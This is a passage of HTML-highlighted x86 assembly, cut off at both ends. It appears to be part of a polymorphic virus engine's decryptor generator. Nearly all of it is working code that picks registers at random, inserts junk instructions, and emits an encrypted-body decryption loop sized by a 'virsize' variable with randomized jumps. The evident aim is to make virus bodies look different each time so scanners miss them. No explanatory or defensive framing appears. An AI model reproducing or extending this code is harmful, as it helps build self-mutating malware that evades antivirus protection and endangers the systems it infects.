        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">out_call</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_arg1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_decrstart</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">callx</span><span class="sc0">
</span><span class="sc5">call2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">out_jmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_arg1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_decrstart</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_label</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_oldrva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_jmpto</span><span class="sc0">
</span><span class="sc5">callx</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; decryptor itself</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_hooy</span><span class="sc0">

</span><span class="sc5">do_decr</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; decrstart:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_label</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_oldrva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_decrstart</span><span class="sc0">             </span><span class="sc1">; ID</span><span class="sc0">

</span><span class="sc1">;       mov     eax, buf_ptr</span><span class="sc0">
</span><span class="sc1">;       mov     byte ptr [eax], 0cch</span><span class="sc0">
</span><span class="sc1">;       mov     buf_size, 1</span><span class="sc0">
</span><span class="sc1">;       call    flush_as_opcode</span><span class="sc0">

</span><span class="sc1">; select # of regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; 3..5</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">d_count</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; select var_tempN or push/pop -usage type</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">t1</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">t2</span><span class="sc0">
</span><span class="sc5">t0</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_dword</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">tx</span><span class="sc0">
</span><span class="sc5">t1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">tx</span><span class="sc0">
</span><span class="sc5">t2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">tx</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">d_type</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; init trash params</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">init_etg</span><span class="sc0">

</span><span class="sc1">; alloc &amp; save regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">__c1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getreg</span><span class="sc0">
        </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__c1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">d_reg</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">var_temp0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">savereg</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">trasher_avail</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d_count</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__c1</span><span class="sc0">

</span><span class="sc1">; init consts</span><span class="sc0">
        </span><span class="sc5">mac1</span><span class="sc0">    </span><span class="sc5">cmd_v_c</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_mov</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_index</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; index=0</span><span class="sc0">
        </span><span class="sc5">mac1</span><span class="sc0">    </span><span class="sc5">cmd_v_v</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_mov</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_key1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_key1_c</span><span class="sc0">  </span><span class="sc1">; key1 = key1_c</span><span class="sc0">
        </span><span class="sc5">mac1</span><span class="sc0">    </span><span class="sc5">cmd_v_v</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_mov</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_key2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_key2_c</span><span class="sc0">  </span><span class="sc1">; key2 = key2_c</span><span class="sc0">

        </span><span class="sc1">; cycle:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_label</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_oldrva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_cycle</span><span class="sc0">                 </span><span class="sc1">; ID</span><span class="sc0">

        </span><span class="sc5">mac1</span><span class="sc0">    </span><span class="sc5">cmd_v_v</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_mov</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_x1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_index</span><span class="sc0">      </span><span class="sc1">; mov x1, index</span><span class="sc0">
        </span><span class="sc5">mac1</span><span class="sc0">    </span><span class="sc5">cmd_v_v</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_add</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_x1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_srcptr</span><span class="sc0">     </span><span class="sc1">; add x1, srcptr</span><span class="sc0">
        </span><span class="sc5">mac1</span><span class="sc0">    </span><span class="sc5">cmd_v_memv</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_mov</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_t</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_x1</span><span class="sc0">       </span><span class="sc1">; mov t, [x1]</span><span class="sc0">

        </span><span class="sc5">mac1</span><span class="sc0">    </span><span class="sc5">cmd_v_v</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">z_cmd1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_t</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_key1</span><span class="sc0">         </span><span class="sc1">; z_cmd1 t, var_key1</span><span class="sc0">
        </span><span class="sc5">mac1</span><span class="sc0">    </span><span class="sc5">cmd_v_v</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">z_cmd2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_key1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_key2</span><span class="sc0">      </span><span class="sc1">; z_cmd2 var_key1, var_key2</span><span class="sc0">

        </span><span class="sc5">mac1</span><span class="sc0">    </span><span class="sc5">cmd_v_v</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_mov</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_x2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_index</span><span class="sc0">      </span><span class="sc1">; mov x2, index</span><span class="sc0">
        </span><span class="sc5">mac1</span><span class="sc0">    </span><span class="sc5">cmd_v_v</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_add</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_x2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_dstptr</span><span class="sc0">     </span><span class="sc1">; add x2, dstptr</span><span class="sc0">
        </span><span class="sc5">mac1</span><span class="sc0">    </span><span class="sc5">cmd_memv_v</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_mov</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_x2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_t</span><span class="sc0">       </span><span class="sc1">; mov [x2], t</span><span class="sc0">

        </span><span class="sc5">mac1</span><span class="sc0">    </span><span class="sc5">cmd_v_v</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_add</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_index</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_4</span><span class="sc0">      </span><span class="sc1">; add index, var_4</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">trasher_on</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">trasher_on</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">mac1</span><span class="sc0">    </span><span class="sc5">cmd_v_v</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmd_cmp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_index</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">var_virsize</span><span class="sc0"> </span><span class="sc1">; cmp index, var_virsize</span><span class="sc0">

</span><span class="sc1">;--------------------</span><span class="sc0">

        </span><span class="sc1">; 82 85 8C   JB JL JNE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__r1</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__r2</span><span class="sc0">
</span><span class="sc5">__r0</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__rx</span><span class="sc0">
</span><span class="sc5">__r1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__rx</span><span class="sc0">
</span><span class="sc5">__r2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
</span><span class="sc5">__rx</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__j1</span><span class="sc0">

</span><span class="sc5">__j0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; find reg</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">__z2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d_reg</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__z1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d_count</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__z2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__j1</span><span class="sc0">
</span><span class="sc5">__z1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_jtab_x</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_cycle</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__o1</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">__o1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">tmp1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">tmp2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc1">; setxx r8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">                 </span><span class="sc1">; setxx r8</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0C0h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_opcode</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc5">trasher_on</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">trasher_avail</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">trasher_avail</span><span class="sc0">

        </span><span class="sc1">; mov?x r32, r8</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d_count</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d_reg</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0B6h</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; zx/sx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0C0h</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_opcode</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__skip_bts</span><span class="sc0">
        </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">__skip_bts</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">trasher_avail</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">trasher_avail</span><span class="sc0">

        </span><span class="sc1">; jmp dword ptr [jtab+r32*4]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24FFh</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">85h</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_opcode</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_fixup</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_arg1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_jtab</span><span class="sc0">

        </span><span class="sc6">bts</span><span class="sc0">     </span><span class="sc5">regavail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;       push    hooy</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_hooy</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_label</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_oldrva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_jtab</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_fixup</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tmp1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_arg1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_as_fixup</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tmp2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_arg1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;       pop     hooy</span><span class="sc0">
</span><span class="sc1">;       call    trasher_avail</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_hooy</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_label</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_oldrva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ID_jtab_x</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__jx</span><span class="sc0">
</span><span class="sc5">__j1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">                   </span><span class="sc1">; jx cycle</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
